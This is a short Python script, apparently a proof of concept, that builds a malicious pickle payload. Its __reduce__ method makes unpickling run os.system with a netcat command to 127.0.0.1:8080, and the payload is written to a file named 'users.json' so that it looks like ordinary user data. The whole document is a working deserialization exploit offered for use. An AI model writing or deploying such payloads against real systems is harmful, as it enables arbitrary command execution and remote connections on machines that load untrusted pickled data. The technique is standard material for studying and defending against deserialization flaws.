import os
import pickle
class Exploit(object):
	def __reduce__(object):
		command = 'nc 127.0.0.1 8080'
		return (os.system, (command,))
serialized = pickle.dumps(Exploit())
filename = 'users.json'

with open(filename, 'wb') as file_object:
	file_object.write(serialized) 
    